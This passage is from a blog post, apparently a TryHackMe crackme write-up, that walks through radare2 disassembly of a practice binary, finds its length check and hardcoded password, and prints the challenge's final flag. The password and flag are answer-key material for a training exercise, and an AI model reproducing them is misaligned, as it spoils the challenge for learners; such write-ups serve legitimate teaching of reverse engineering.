+|       |   0x000011d2      488d3daf0e00.  lea rdi, str.Is_it_correct___I_dont_think_so. <span class="p">;</span> 0x2088 <span class="p">;</span> <span class="s2">"Is it correct , I don't think so."</span> <span class="p">;</span> const char <span class="k">*</span>s
+|       |   0x000011d9      e852feffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
+|       |   0x000011de      bf00000000     mov edi, 0
+|       |   0x000011e3      e878feffff     call sym.imp.exit
+|       |   <span class="p">;</span> CODE XREF from main @ 0x11d0
+|       <span class="sb">`</span>-&gt; 0x000011e8      c745fc000000.  mov dword <span class="o">[</span>var_4h], 0
+|       ,<span class="o">=</span>&lt; 0x000011ef      eb34           jmp 0x1225
+|       |   <span class="p">;</span> CODE XREF from main @ 0x122b
+|      .--&gt; 0x000011f1      8b45fc         mov eax, dword <span class="o">[</span>var_4h]
+|      :|   0x000011f4      4898           cdqe
+|      :|   0x000011f6      0fb65405ea     movzx edx, byte <span class="o">[</span>rbp + rax - 0x16]
+|      :|   0x000011fb      8b45fc         mov eax, dword <span class="o">[</span>var_4h]
+|      :|   0x000011fe      4898           cdqe
+|      :|   0x00001200      0fb64405c0     movzx eax, byte <span class="o">[</span>rbp + rax - 0x40]
+|      :|   0x00001205      38c2           cmp dl, al
+|     ,<span class="o">===</span>&lt; 0x00001207      7506           jne 0x120f
+|     |:|   0x00001209      8345fc01       add dword <span class="o">[</span>var_4h], 1
+|    ,<span class="o">====</span>&lt; 0x0000120d      eb16           jmp 0x1225
+|    <span class="o">||</span>:|   <span class="p">;</span> CODE XREF from main @ 0x1207
+|    |<span class="sb">`</span><span class="nt">---</span><span class="o">&gt;</span> 0x0000120f      488d3d940e00.  lea rdi, str.Nope           <span class="p">;</span> 0x20aa <span class="p">;</span> <span class="s2">"Nope"</span> <span class="p">;</span> const char <span class="k">*</span>s
+|    | :|   0x00001216      e815feffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
+|    | :|   0x0000121b      bf00000000     mov edi, 0
+|    | :|   0x00001220      e83bfeffff     call sym.imp.exit
+|    | :|   <span class="p">;</span> CODE XREFS from main @ 0x11ef, 0x120d
+|    <span class="sb">`</span><span class="nt">--</span><span class="sb">`</span>-&gt; 0x00001225      8b45fc         mov eax, dword <span class="o">[</span>var_4h]
+|      :    0x00001228      3b45f8         cmp eax, dword <span class="o">[</span>var_8h]
+|      <span class="sb">`</span><span class="o">==</span>&lt; 0x0000122b      7cc4           jl 0x11f1
+|           0x0000122d      488d3d7b0e00.  lea rdi, str.Well_Done___   <span class="p">;</span> 0x20af <span class="p">;</span> <span class="s2">"Well Done !!"</span> <span class="p">;</span> const char <span class="k">*</span>s
+|           0x00001234      e8f7fdffff     call sym.imp.puts           <span class="p">;</span> int puts<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
+|           0x00001239      b800000000     mov eax, 0
+|           0x0000123e      c9             leave
+<span class="se">\ </span>          0x0000123f      c3             ret
+
+here we have to focus on three lines : 
+
+|           0x000011c4      e877feffff     call sym.imp.strlen         <span class="p">;</span> size_t strlen<span class="o">(</span>const char <span class="k">*</span>s<span class="o">)</span>
+|           0x000011c9      8945f8         mov dword <span class="o">[</span>var_8h], eax
+|           0x000011cc      837df80d       cmp dword <span class="o">[</span>var_8h], 0xd
+|       ,<span class="o">=</span>&lt; 0x000011d0      7416           je 0x11e8
+
+This checks <span class="k">if </span>the string length is equal to 13
+
+<span class="c"># Lets confirm our finding</span>
+
+┌──<span class="o">(</span>void㉿kali<span class="o">)</span>-[~/tryhackme/0x41haz]
+└─<span class="nv">$ </span>./0x41haz.0x41haz
+<span class="o">=======================</span>
+Hey , Can You Crackme ?
+<span class="o">=======================</span>
+Its jus a simple binary 
+
+Tell Me the Password :
+aaaaaaaaaaaaa
+Nope
+
+Further analysing : 
+|           0x00001169      4883ec40       sub rsp, 0x40
+|           0x0000116d      48b832404032.  movabs rax, 0x6667243532404032 <span class="p">;</span> <span class="s1">'2@@25$gf'</span>
+|           0x00001177      488945ea       mov qword <span class="o">[</span>var_16h], rax
+|           0x0000117b      c745f2735426.  mov dword <span class="o">[</span>var_eh], 0x40265473 <span class="p">;</span> <span class="s1">'sT&amp;@'</span>
+|           0x00001182      66c745f64c00   mov word <span class="o">[</span>var_ah], 0x4c     <span class="p">;</span> <span class="s1">'L'</span>
+
+As it is compared at the end string will be : 2@@25<span class="nv">$gfsT</span>&amp;@L
+Note : This was at the start of the main <span class="k">function </span>so it was really easy to find password.
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Confirming out password</span>
+./0x41haz.0x41haz
+<span class="o">=======================</span>
+Hey , Can You Crackme ?
+<span class="o">=======================</span>
+Its jus a simple binary 
+
+Tell Me the Password :
+2@@25<span class="nv">$gfsT</span>&amp;@L
+Well Done <span class="o">!!</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Final flag : THM{Its easy find yourself}</p>
+</blockquote>
+
+<p>Thank you thats all for today’s challange!</p>]]></content><author><name>VOiD | Ayush Panwar</name><email>mailto:ayushpanwar.qu@gmail.com</email></author><summary type="html"><![CDATA[VOiD XD]]></summary></entry></feed>
